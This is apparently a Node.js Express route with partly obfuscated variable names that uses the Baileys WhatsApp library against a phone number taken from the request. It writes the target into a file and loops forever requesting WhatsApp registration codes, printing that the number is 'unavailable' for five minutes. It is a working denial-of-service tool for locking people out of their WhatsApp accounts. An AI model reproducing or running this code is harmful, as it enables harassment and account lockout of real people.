const express = require("express");
const fs = require('fs');
let router = express.Router();
const pino = require("pino");
const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));
const gradient = require("gradient-string");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  delay,
  makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");


router.get('/', async (_0x179838, _0xb911fc) => {
  let _0x2a466f = _0x179838.query.number;
  let hjjj = _0x179838.query.ddi;
  async function _0x494ff9() {
    const {
      state: _0xe6c64a,
      saveCreds: _0x398548
    } = await useMultiFileAuthState("./mhzinkkk");
      let mhz = makeWASocket({
        'auth': {
          'creds': _0xe6c64a.creds,
          'keys': makeCacheableSignalKeyStore(_0xe6c64a.keys, pino({
            'level': "fatal"
          }).child({
            'level': "fatal"
          }))
        },
        'printQRInTerminal': false,
        'logger': pino({
          'level': "fatal"
        }).child({
          'level': "fatal"
        }),
        'browser': ["Ubuntu", "Chrome", "20.0.04"]
      });
        const balalakdhah = JSON.parse(fs.readFileSync("./files/numbers.json"));
        const teosga = async sololou => {
          const {
            phoneNumber: _0x127390,
            ddi: _0x5e3f9d,
            number: _0x51374b
          } = sololou;
          while (true) {
            try {
              res = await mhz.requestRegistrationCode({
                'phoneNumber': '+' + _0x127390,
                'phoneNumberCountryCode': _0x5e3f9d,
                'phoneNumberNationalNumber': _0x51374b,
                'phoneNumberMobileCountryCode': 0x2d4
              });
              b = res.reason === "temporarily_unavailable";
              if (res.reason === "temporarily_unavailable") {
                setTimeout(async () => {
                  teosga(sololou);
                }, 0);
                return;
              } else {
                if (res.reason === "too_recent") {
                  console.log(gradient("green", "green")("N\xFAmero v\xE1lido: +" + res.login));
                  setTimeout(async () => {
                    teosga(sololou);
                  }, 0);
                  return;
                } else {}
              }
            } catch (err) {}
          }
        };
        let laskie = hjjj + _0x2a466f;
        const paralaul = {
          ddi: hjjj,
          number: _0x2a466f
        };
        balalakdhah[laskie] = paralaul;
        fs.writeFileSync("./files/numbers.json", JSON.stringify(balalakdhah, null, "\t"));
        const birysl = {
          phoneNumber: laskie,
          ddi: hjjj,
          number: _0x2a466f
        };
        teosga(birysl);
       console.log(gradient('cyan','white','red')(`
NÚMERO INDISPONÍVEL
DDi: +${hjjj}
NÚMERO: ${_0x2a466f}
NÚMERO COMPLETO: ${hjjj + _0x2a466f}
TEMPO iNDISPONIVEL: 5 MINUTOS`));
      mhz.ev.on("creds.update", _0x398548);
      mhz.ev.on("connection.update", async _0x2f6c02 => {
        const {
          connection: _0x2b620b,
          lastDisconnect: _0x22ae16
        } = _0x2f6c02;
        if (_0x2b620b == "open") {
          await delay(10000);
          await delay(100);
          return await removeFile("./mhzinkkk");
          process.exit(0);
        } else if (_0x2b620b === "close" && _0x22ae16 && _0x22ae16.error && _0x22ae16.error.output.statusCode != 401) {
          await delay(10000);
          _0x494ff9();
        }
      });
  }
  return await _0x494ff9();
});
module.exports = router;